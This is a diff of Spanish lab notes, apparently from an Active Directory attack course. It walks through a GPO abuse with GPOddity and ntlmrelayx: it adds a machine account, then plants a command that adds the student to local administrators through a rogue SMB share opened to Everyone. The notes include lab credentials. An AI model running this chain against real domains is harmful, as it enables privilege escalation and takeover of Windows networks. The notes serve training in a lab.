@@ -313,28 +313,33 @@ write_gpo_dacl student97 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 
 ```ad-warning
 
-En caso de no poder hacerlo por que el usuario no conste en la maquina podemos crear un usuario nuevo
+En caso de no poder hacerlo por que el usuario no conste en la maquina podemos crear un usuario nuevo, y luego volver a intentar añadir la GPO de nuevo
 ```shell
+[dcorp\devopsadmin]
 add_computer std97-gpattack Secretpass@123
 ```
 
-Una ves tengamos la respuesta necesaria con nuestro Have Fun, deberemos de detener el interprete de comandos LDAP y el ntlmrelayx y así poder ejecutar GPOddity
+Una vez tengamos la respuesta necesaria con nuestro Have Fun, deberemos de detener el interprete de comandos LDAP y el ntlmrelayx y así poder ejecutar GPOddity
 ```shell
+[WSL]
 cd /mnt/c/AD/Tools/GPOddity
 ```
 
 Y ejecutar GPOddity
 ```shell
+[WSL]
 sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student97' --password 'vy8HMb2BmT6xGGaM' --command 'net localgroup administrators student97 /add' --rogue-smbserver-ip '172.16.100.97' --rogue-smbserver-share 'std97-gp' --dc-ip '172.16.2.1' --smb-mode none
 ```
 
 Ahora deberemos de mantenerlo corriendo y en una WSL Ubuntu nueva deberemos de comaprtir el directorio std97-pg
 ```shell
+[WSL]
 cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std97-gp
 ```
 
 Deberemos abrir una nueva consola de Windows como Administrador para crear un recurso compartido std97-gp y asignarle privilegios para todos
 ```shell
+[student97]
 net share std687-gp=C:\AD\Tools\std97-gp /grant:Everyone,Full
 ```
 ```shell
@@ -343,6 +348,7 @@ icacls "C:\AD\Tools\std97-gp" /grant Everyone:F /T
 
 Ahora podemos verificar si se ha modificado la ruta de *gPCfileSysPath* de la política de DevOps
 ```shell
+[studen97]
 Get-DomainGPO -Identity "DevOps Policy"
 ```
 
